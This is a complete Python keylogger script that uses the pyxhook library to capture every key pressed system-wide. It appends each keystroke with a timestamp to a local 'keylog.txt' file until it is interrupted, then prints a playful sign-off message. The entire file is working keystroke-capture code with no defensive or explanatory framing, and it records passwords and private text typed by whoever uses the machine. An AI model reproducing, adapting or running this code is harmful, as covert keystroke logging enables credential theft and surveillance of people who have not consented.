import pyxhook
import time
import sys
import signal

# Create a hook manager
hookman = pyxhook.HookManager()

# Define a function to handle keyboard events
def on_key_press(event):
    # Get the current timestamp
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    # Create a log file if it doesn't exist
    log_file = "keylog.txt"
    with open(log_file, "a") as f:
        # Write the key press event to the log file
        f.write(f"{timestamp} - Key pressed: {event.Key}\n")

# Define a function to handle keyboard interrupts
def signal_handler(sig, frame):
    print("\nLove you 3000, Shady!")
    hookman.cancel()
    sys.exit(0)

# Set the hook
hookman.HookKeyboard()
hookman.KeyDown = on_key_press

# Set the signal handler
signal.signal(signal.SIGINT, signal_handler)

# Start the hook
hookman.start()

# Wait for the hook to be cancelled
while hookman.is_running():
    time.sleep(1)
